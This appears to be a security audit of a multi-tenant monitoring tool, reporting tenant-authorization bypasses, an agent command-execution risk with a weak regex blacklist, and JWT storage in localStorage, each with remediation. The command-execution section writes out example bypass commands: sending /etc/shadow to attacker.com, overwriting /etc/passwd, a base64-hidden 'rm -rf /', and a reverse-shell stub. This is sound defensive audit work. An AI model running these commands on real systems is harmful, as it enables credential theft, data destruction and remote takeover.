# Security Architecture & Forensic Vulnerability Audit

## 1. Authentication & Identity Architecture

The system utilizes two distinct authentication mechanisms:
1. **User / Dashboard JWTs**:
   - Algorithm: HMAC-SHA256 (`SignatureAlgorithm.HS256`).
   - Secret Key: Configured via `app.jwt.secret` (must be >= 32 bytes or `base64:` prefixed).
   - Subject: `companyId` (UUID string).
   - Issuer: `monitor-tool`.
   - Expiration: Configurable via `app.jwt.expirationMinutes` (default 60 minutes).
   - Transport: HTTP `Authorization: Bearer <jwt>` and STOMP `CONNECT` header `Authorization: Bearer <jwt>`.
2. **Agent Provisioning Tokens (`apiToken`)**:
   - Generated during company registration as a random UUID string (`UUID.randomUUID().toString()`).
   - Stored in plaintext in the `company` table (`api_token` column with unique constraint).
   - Shared across all agents belonging to the same company.
   - Transport: Body field on `/agent/register`, HTTP header `x-agent-token: <token>` on detail uploads, and native STOMP header `x-agent-token: <token>` on WebSocket `CONNECT`.

---

## 2. Forensic Vulnerability & Security Risk Audit

### Vulnerability 1: Multi-Tenant WebSocket Subscription Authorization Bypass (CRITICAL)
- **Severity**: **Critical (CVSS 9.1)**
- **Classification**: Broken Object Level Authorization (BOLA / IDOR)
- **Location**: `backend/src/main/java/com/monitor/config/WebSocketAuthInterceptor.java`
- **Code Forensic Evidence**:
  Lines 44-46 state:
  ```java
  // Note: We don't enforce user presence for SEND/SUBSCRIBE/UNSUBSCRIBE
  // because the authentication is already validated during CONNECT
  // and the session maintains the authentication state
  ```
  While `CONNECT` authenticates the caller to their own `companyId`, the broker **does not validate tenant ownership when a client issues a `SUBSCRIBE` frame** to `/topic/device/{deviceId}`, `/topic/agent/{deviceId}`, or `/topic/command-result/{deviceId}`!
- **Exploitation Scenario**:
  An authenticated operator from Company A who obtains or guesses the UUID of a device belonging to Company B can send a STOMP frame:
  `SUBSCRIBE id:sub-0 destination:/topic/device/{Company-B-Device-UUID}`.
  The Spring `SimpleBroker` will happily stream all live metrics and system details of Company B to Company A.
- **Recommended Remediation**:
  Implement destination authorization in `WebSocketAuthInterceptor.preSend()`: for any frame where `StompCommand.SUBSCRIBE` targets `/topic/device/*`, `/topic/agent/*`, or `/topic/command-result/*`, parse the destination UUID, lookup device ownership, and verify `device.getCompany().getId().equals(sessionCompanyId)`.

### Vulnerability 2: Missing Tenant Authorization on Device Metrics REST Endpoint (HIGH)
- **Severity**: **High (CVSS 7.5)**
- **Location**: `backend/src/main/java/com/monitor/controller/DeviceController.java:32-35`
- **Code Forensic Evidence**:
  ```java
  @GetMapping("/{deviceId}/metrics")
  public List<Metric> getMetrics(@PathVariable UUID deviceId) {
      return deviceService.getMetrics(deviceId);
  }
  ```
  Compare this to line 39 of the same controller:
  ```java
  @GetMapping("/{deviceId}/metrics-detail")
  public List<MetricDetailResponse> getDetailedMetrics(@PathVariable UUID deviceId) {
      UUID companyId = (UUID) SecurityContextHolder.getContext().getAuthentication().getPrincipal();
      return deviceService.getDetailedMetrics(companyId, deviceId); // Validates companyId!
  }
  ```
- **Hazard**: `getMetrics` completely omits company verification! Any authenticated user in the system can query historical telemetry for any device UUID across all companies.
- **Recommended Remediation**:
  Pass `companyId` into `deviceService.getMetrics(companyId, deviceId)` and verify `device.getCompany().getId().equals(companyId)`.

### Vulnerability 3: Remote Arbitrary Code Execution (RCE) via Agent Command Loop (HIGH)
- **Severity**: **High (Inherent Architectural Design Risk)**
- **Location**: `monitor-agent/service/commands.go:220-257`
- **Code Forensic Evidence**:
  ```go
  var blockedCommandPattern = regexp.MustCompile(
      `(?i)\b(rm|remove-item|removeitem|del|erase|rmdir|rd|format)\b`,
  )
  ```
  The agent executes shell commands directly via `sh -c` (Linux/macOS) or `powershell.exe -Command` (Windows). The only protection is a naive blacklist regex blocking `rm`, `del`, `format`, etc.
- **Bypass Demonstration**:
  - Attackers can run arbitrary commands that do not use the blocked keywords:
    - Exfiltration: `curl -d @/etc/shadow https://attacker.com`
    - Overwriting: `echo "" > /etc/passwd`
    - Base64 evasion: `echo cm0gLXJmIC8= | base64 -d | sh`
    - Reverse shell: `python3 -c 'import socket,os,pty;...'`
- **Mitigation**:
  1. Restrict agent execution to an explicit **allowlist** of predefined diagnostics scripts rather than accepting arbitrary shell strings from the network.
  2. Implement asymmetric cryptographic signature verification (Ed25519) on command payloads: the agent should verify the signature against a pinned public key before running any command.

### Vulnerability 4: JWT Stored in Browser `localStorage` (MEDIUM)
- **Severity**: **Medium (CVSS 5.4)**
- **Location**: `frontend/lib/auth.ts:13`
- **Hazard**: The authentication JWT and Company Profile are stored in `window.localStorage`. If any XSS vulnerability exists or is introduced via third-party npm packages, the token can be exfiltrated by malicious JavaScript.
- **Mitigation**: Switch to `httpOnly`, `Secure`, `SameSite=Strict` cookies issued by the backend.\n